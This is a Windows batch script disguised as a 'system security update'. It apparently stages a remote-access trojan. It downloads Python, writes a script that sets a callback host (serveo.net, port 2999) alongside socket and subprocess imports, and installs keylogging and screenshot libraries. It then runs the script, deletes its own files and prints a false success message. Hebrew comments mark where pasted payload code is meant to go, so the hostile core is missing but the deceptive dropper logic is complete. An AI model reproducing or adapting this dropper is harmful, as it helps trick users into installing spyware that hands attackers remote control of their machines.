@echo off
title System Update Installation
color 0A

echo.
echo  ============================================
echo   SYSTEM SECURITY UPDATE INSTALLATION
echo  ============================================
echo.
echo  [*] Checking system requirements...

:: בדיקה אם Python קיים
python --version >nul 2>&1
if %errorlevel% == 0 (
    echo  [+] Python detected - proceeding with update...
    goto :download_python
) else (
    echo  [!] Python not found - installing Python...
    goto :install_python
)

:install_python
echo  [*] Downloading Python installer...
:: הורדת Python הפורטבלי (קטן יותר)
powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip' -OutFile 'python_portable.zip'"

if exist "python_portable.zip" (
    echo  [+] Python downloaded successfully
    echo  [*] Extracting Python...
    
    :: חילוץ Python
    powershell -Command "Expand-Archive -Path 'python_portable.zip' -DestinationPath 'python_portable' -Force"
    
    :: הוספה ל-PATH זמנית
    set PATH=%cd%\python_portable;%PATH%
    
    echo  [+] Python installed successfully
) else (
    echo  [-] Failed to download Python
    echo  [*] Trying alternative method...
    goto :download_python
)

:download_python
echo  [*] Downloading system update script...

:: יצירת קובץ Python
echo import sys > update_script.py
echo import os >> update_script.py
echo import socket >> update_script.py
echo import time >> update_script.py
echo import base64 >> update_script.py
echo import subprocess >> update_script.py
echo import threading >> update_script.py
echo import platform >> update_script.py
echo.
echo # הקוד המלא שלך מ-paste.txt
echo CONSTIP = "serveo.net" >> update_script.py
echo CONSTPT = 2999 >> update_script.py
echo.
echo # [כאן תכניס את כל הקוד מ-paste.txt]
echo.

:: הוספת ספריות נדרשות
echo  [*] Installing required packages...
python -m pip install --user psutil pillow pyautogui pynput pyscreenshot win32gui tabulate 2>nul

:: הפעלת הסקריפט
echo  [*] Starting system update...
python update_script.py

:: ניקוי
echo  [*] Cleaning up temporary files...
del update_script.py 2>nul
if exist "python_portable.zip" del python_portable.zip 2>nul
if exist "python_portable" rmdir /s /q python_portable 2>nul

echo  [+] System update completed successfully!
timeout /t 3 /nobreak >nul
exit
